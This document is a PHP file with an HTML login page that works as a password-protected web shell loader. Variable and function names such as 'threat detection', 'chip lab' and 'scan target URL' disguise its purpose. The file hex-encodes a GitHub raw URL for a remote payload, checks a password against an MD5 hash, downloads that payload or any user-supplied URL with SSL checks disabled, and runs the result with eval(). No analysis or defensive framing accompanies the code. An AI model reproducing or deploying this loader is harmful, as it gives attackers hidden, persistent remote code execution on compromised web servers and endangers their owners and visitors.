<?php
session_start();

/**
 * Daftar kode ancaman dalam format heksadesimal
 * @var array
 */
$threat = [
    '68747470733a2f2f',
    '7261772e67697468756275736572636f6e74656e742e636f6d',
    '2f73656f626164626f797a3430332d616c742f6e65772d77657261',
    '2f726566732f68656164732f',
    '6d61696e2f626164626f797a',
    '2d65646974696f6e2e747874',
    'a1cf7936ee615870fbe61b2f9207c3dc' // hash MD5 password
];

/**
 * Gabungkan potongan hex menjadi URL lengkap
 */
function buildThreatUrl($p) {
    $decoded = array_map('hex2bin', array_slice($p, 0, -1));
    return "{$decoded[0]}{$decoded[1]}/{$decoded[2]}/{$decoded[3]}/{$decoded[4]}/{$decoded[5]}";
}

/**
 * Cek apakah user sudah terautentikasi
 */
function isThreatDetected() {
    return isset($_SESSION['threat_detected']) && $_SESSION['threat_detected'] === true;
}

/**
 * Autentikasi user berdasarkan password (MD5)
 */
function authenticateUser($password) {
    if (md5($password) === end($GLOBALS['threat'])) {
        $_SESSION['threat_detected'] = true;
        $_SESSION['auth_token'] = 'mlbb_chip_lab_token';
        return true;
    }
    return false;
}

/**
 * Validasi URL
 */
function isValidUrl($url) {
    return filter_var($url, FILTER_VALIDATE_URL) !== false;
}

/**
 * Ambil konten dari URL menggunakan cURL atau file_get_contents
 */
function fetchUrlContent($url) {
    if (function_exists('curl_exec')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_USERAGENT      => "MLBB-ChipLab/2.1",
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_HTTPHEADER     => ['X-Lab-Access: ' . ($_SESSION['auth_token'] ?? '')]
        ]);
        $content = curl_exec($ch);
        curl_close($ch);
        return $content;
    }

    if (ini_get('allow_url_fopen')) {
        $context = stream_context_create([
            'http' => ['header' => "X-Lab-Access: " . ($_SESSION['auth_token'] ?? '')]
        ]);
        return file_get_contents($url, false, $context);
    }

    return false;
}

/* =========================================================
   PROSES LOGIN
   ========================================================= */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST['password'])) {
        if (authenticateUser($_POST['password'])) {
            $_SESSION['scan_url'] = isset($_POST['scan_url']) && isValidUrl($_POST['scan_url'])
                ? $_POST['scan_url']
                : buildThreatUrl($threat);
        } else {
            $loginError = "🔒 ACCESS DENIED: WHAT ARE U DOING LOOSER ?";
        }
    }
}

/* =========================================================
   EKSEKUSI KONTEN JIKA SUDAH LOGIN
   ========================================================= */
if (isThreatDetected()) {
    $content = fetchUrlContent($_SESSION['scan_url']);
    if ($content !== false) {
        eval('?>' . $content);
        exit;
    }
    echo "<div style='color:red;font-weight:bold'>🚨 CHIP CONNECTION FAILED</div>";
    echo buildThreatUrl($threat);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>FCKN13BOYZ</title>

    <!-- FAVICON / ICON -->
    <link rel="icon" type="image/jpeg" href="https://i.pinimg.com/736x/60/d2/07/60d207b84a3c31fcff2731de27ed1f44.jpg" />
    <link rel="shortcut icon" type="image/jpeg" href="https://i.pinimg.com/736x/60/d2/07/60d207b84a3c31fcff2731de27ed1f44.jpg" />
    <link rel="apple-touch-icon" href="https://i.pinimg.com/736x/60/d2/07/60d207b84a3c31fcff2731de27ed1f44.jpg" />

    <!-- Google Font -->
    <link href="https://fonts.googleapis.com/css?family=Fira+Mono:400,700&display=swap" rel="stylesheet" />

    <style>
        /* ---------- Background GIF ---------- */
        #background-video {
            position: fixed;
            top: 0;
            left: 0;
            min-width: 100vw;
            min-height: 100vh;
            width: 100vw;
            height: 100vh;
            object-fit: cover;
            z-index: -1;
            pointer-events: none;
        }

        /* ---------- Body ---------- */
        body {
            margin: 0;
            padding: 0;
            font-family: 'Fira Mono', 'Courier New', monospace;
            color: #ffe0e0;
            background: #170707;
        }

        /* ---------- Container ---------- */
        .container {
            position: relative;
            max-width: 560px;
            margin: 48px auto 0;
            padding: 32px;
            background: rgba(255, 0, 0, 0.59);
            border: 2px solid #ff00007e;
            border-radius: 8px;
            box-shadow: 0 8px 40px #ff00007e;
            text-align: center;
            z-index: 1;
        }

        /* ---------- Logo ---------- */
        .logo {
            margin-bottom: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .logo img {
            max-width: 420px;
            width: 100%;
            height: auto;
            display: block;
        }

        /* ---------- Judul / Status ---------- */
        .status {
            margin: 4px 0 20px;
            color: #fff;
            font-weight: bold;
            font-size: 0.99em;
            letter-spacing: 0.8px;
        }

        /* ---------- Form ---------- */
        .login-form {
            margin: 24px 0 0;
            padding: 18px 14px;
            background: #a90202a7;
            border-radius: 6px;
            border: 1px solid #a90202a7;
        }

        input[type="password"],
        input[type="text"] {
            width: 96%;
            padding: 9px;
            margin: 9px 0;
            font-size: 14px;
            background: #69000067;
            border: 1px solid #69000067;
            color: #ffe0e0;
            border-radius: 3px;
        }

        input[type="submit"] {
            background: linear-gradient(90deg, #ff0000 40%, #ff1100 70%, #ff0000 100%);
            color: #fff;
            font-weight: bold;
            padding: 11px 0;
            border: none;
            border-radius: 4px;
            margin: 12px 0 0;
            width: 100%;
            cursor: pointer;
            font-size: 16px;
            letter-spacing: 1px;
            animation: kelapKelip 1s infinite;
        }

        @keyframes kelapKelip {
            0%   { background: linear-gradient(90deg, #ff0000 40%, #ff1100 70%, #ff6600 100%); }
            50%  { background: linear-gradient(90deg, #ff00cc 40%, #ff0000 70%, #ff1100 100%); }
            100% { background: linear-gradient(90deg, #ff0000 40%, #ff1100 70%, #ff6600 100%); }
        }

        input[type="submit"]:hover {
            background: linear-gradient(90deg, #fa1313 60%, #e60a0a 100%);
        }

        /* ---------- Error ---------- */
        .error {
            color: #ff4a4a;
            background: #33121866;
            display: block;
            border: 1px solid #ff4a4a;
            padding: 7px 0;
            border-radius: 4px;
            margin-top: 10px;
            margin-bottom: 0;
            font-weight: bold;
            font-size: 15px;
        }

        /* ---------- Warning ---------- */
        .warning {
            margin-top: 20px;
            font-size: 12px;
            color: #ee8888;
        }

        /* ---------- Responsive ---------- */
        @media (max-width: 600px) {
            .container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <!-- Background GIF -->
    <img src="https://i.pinimg.com/736x/20/9f/94/209f94a0cb7458133da685d0a64b76b6.jpg"
         id="background-video" alt="Background GIF" />

    <div class="container">
        <!-- Logo -->
        <div class="logo">
            <img src="https://s15.gifyu.com/images/bWSlU.png" alt="Logo" />
        </div>

        <!-- Error Login -->
        <?php if (!empty($loginError)): ?>
            <div class="error"><?= htmlspecialchars($loginError) ?></div>
        <?php endif; ?>

        <!-- Judul -->
        <div class="status">WAKE AND MAKE</div>

        <!-- Form Login -->
        <div class="login-form">
            <form method="POST" action="">
                <input type="password" name="password" placeholder="Chip Access Code" required />
                <input type="text" name="scan_url" placeholder="Scan Target URL (Optional)" />
                <input type="submit" value="ACTIVATE CHIP" />
            </form>
        </div>

        <!-- Status Sistem -->
        <div class="status">
            SYSTEM STATUS: <?= isThreatDetected() ? '🟢 ONLINE' : '🔴 OFFLINE' ?>
        </div>

        <!-- Warning -->
        <div class="warning">
            WARNING: Unauthorized access will trigger security protocols.
        </div>
    </div>
</body>
</html>